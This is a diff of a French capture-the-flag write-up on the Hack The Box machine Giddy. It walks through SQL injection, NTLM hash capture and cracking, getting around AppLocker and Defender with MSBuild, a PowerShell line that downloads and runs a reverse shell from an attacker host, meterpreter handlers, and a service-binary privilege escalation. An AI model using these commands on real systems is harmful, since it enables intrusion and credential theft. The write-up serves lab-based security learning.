@@ -31,7 +31,7 @@ Sur */mvc* on trouve une appli web marchande non identifiée mais très classiqu
 
 Le formulaire de recherche est vulnérable à une injection SQL bien verbeuse :  
 
-```plain
+```
 Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
 Incorrect syntax near ''.
    _1_Injection.Search.Button1_Click(Object sender, EventArgs e) in C:\Users\jnogueira\Downloads\owasp10\1-owasp-top10-m1-injection-exercise-files\before\1-Injection\Search.aspx.cs:30
@@ -45,7 +45,7 @@ Je lance [Wapiti](http://wapiti.sourceforge.net/) sur le site qui trouve différ
 
 J'ai lancé SQLmap sur cette URL qui p'a permis d'obtenir la liste des utilisateurs suivants du système ainsi que différentes infos :  
 
-```plain
+```
 [*] BUILTIN\\Users
 [*] giddy\\stacy
 [*] sa (administrator)
@@ -65,7 +65,7 @@ Ce module utilise en fait la procédure *xp\_dirtree* de MSSQL. J'avais quand m�
 
 On va pour cela mettre d'abord en écoute (et en background) notre port 445 via le module *capture/smb* puis ensuite exécuter le module *stealer* pour provoquer l'utilisation de *xp\_dirtree* sur notre faux partage SMB :  
 
-```plain
+```
 msf auxiliary(server/capture/smb) > show options
 
 Module options (auxiliary/server/capture/smb):
@@ -115,7 +115,7 @@ msf auxiliary(admin/mssql/mssql_ntlm_stealer_sqli) > exploit -j
 
 Il se passe pas loin d'une minute avant que le hash nous parvienne (le suspense était à son comble :D )  
 
-```plain
+```
 msf auxiliary(admin/mssql/mssql_ntlm_stealer_sqli) > [*] SMB Captured - 2018-09-09 16:05:03 +0200
 NTLMv2 Response Captured from 10.10.10.104:50510 - 10.10.10.104
 USER:Stacy DOMAIN:GIDDY OS: LM:
@@ -129,7 +129,7 @@ NT_CLIENT_CHALLENGE:0101000000000000955d6e450f49d4014a45499f2100a5a4000000000200
 
 Un petit coup de *hashcat* plus tard et on a le password en clair :  
 
-```plain
+```
 $ hashcat-cli64.bin -a 0 -m 5600 yolo_netntlmv2 /opt/wordlists/rockyou.txt
 Initializing hashcat v2.00 with 4 threads and 32mb segment-size...
 
@@ -154,7 +154,7 @@ On obtient alors une session Powershell mais la joie est de courte durée puisqu
 
 On serait tenté d'utiliser les commandes DOS pour copier un exécutable (ou même l'appeler directement depuis un partage SMB) mais c'est sans compter sur les GPOs :  
 
-```plain
+```
 Program 'nc64.exe' failed to run: This program is blocked by group policy. For more information, contact your system administrator.
     + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
     + FullyQualifiedErrorId : NativeCommandFailed
@@ -168,7 +168,7 @@ On peut suivre [l'un des exemples de pentestlab](https://pentestlab.blog/2017/05
 
 Sauf qu'au moment de l'exécution :  
 
-```plain
+```
 c:/windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe yolo.csproj
 Microsoft (R) Build Engine version 4.6.1586.0
 [Microsoft .NET Framework, version 4.0.30319.42000]
@@ -202,7 +202,7 @@ Cette fois c'est *Windows Defender* qui fait des siennes...
 
 Une solution est de prendre un template XML qui ne contient pas de shellcodes mais va simplement exécuter du code Powerwhell. On peut se baser [sur celui-ci](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml) qui ne fonctionnera pas tel quel dans notre interface web (car elle ne retransférera pas les commandes saisies vers le process) mais on peut l'éditer simplement pour retirer la boucle dans *Execute()* et mettre à la ligne suivante pour obtenir [notre reverse shell Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) :  
 
-```plain
+```
 RunPSCommand("IEX (New-Object System.Net.WebClient).downloadString('http://10.10.13.82/Invoke-PowerShellTcp.ps1')");
 ```
 
@@ -210,7 +210,7 @@ Avec le shell ainsi obtenu on peut charger d'autres scripts PowerShell bien conn
 
 Durant l'exploration du système j'ai croisé un bon gros troll des familles placé par le créateur de la machine :  
 
-```plain
+```
 PS C:\> Get-UnattendedInstallFile
 
 UnattendPath
@@ -230,7 +230,7 @@ L'avantage de ce fork c'est l'option 2 qui prend le code C# généré par *msfve
 
 Lors de l'appel par MSBuild la chaine base64 est décodée, le code C# compilé puis exécuté à la volée. C'est beau !  
 
-```plain
+```
 $ python nps_payload.py
 
                                      (            (
@@ -276,11 +276,11 @@ Enter the listener port (443): 443
 
 Il ne reste plus qu'à mettre un multi/handler en écoute et passer le csproj généré à MSBuild :  
 
-```plain
+```
 c:/windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe  \\10.10.13.82\public\msbuild_nps.xml
 ```
 
-```plain
+```
 msf exploit(multi/handler) > use multi/handler
 msf exploit(multi/handler) > set payload windows/meterpreter/reverse_https
 payload => windows/meterpreter/reverse_https
@@ -318,7 +318,7 @@ Il y a tout de même un mystérieux fichier *unifivideo* présent dans le dossie
 
 Les conditions semblent être bonnes avec le dossier écrivable dans *ProgramData* :  
 
-```plain
+```
 c:\programdata>icacls unifi-video
 icacls unifi-video
 unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
@@ -332,7 +332,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 Et la présence du fameux service :  
 
-```plain
+```
 PS C:\ProgramData\unifi-video>
 Get-Service -Name "Ubiquiti UniFi Video"
 
@@ -356,14 +356,14 @@ int main(void) {
 $ i686-w64-mingw32-gcc -o taskkill.exe test.c
 ```
 
-```plain
+```
 Start-Service -Name "Ubiquiti UniFi Video"
 Stop-Service -Name "Ubiquiti UniFi Video"
 ```
 
 Ainsi on obtient notre meterpreter depuis lequel on télécharge le flag (CF559C6C121F683BF3E56891E80641B1) et on peut si on le souhaite avoir une invite de commande sans être détecté :)   
 
-```plain
+```
 msf exploit(multi/handler) > [*] https://10.10.13.82:443 handling request from 10.10.10.104; (UUID: dltetexe) Encoded stage with x86/shikata_ga_nai
 [*] https://10.10.13.82:443 handling request from 10.10.10.104; (UUID: dltetexe) Staging x86 payload (180854 bytes) ...
 [*] Meterpreter session 2 opened (10.10.13.82:443 -> 10.10.10.104:50086) at 2018-09-11 21:45:27 +0200
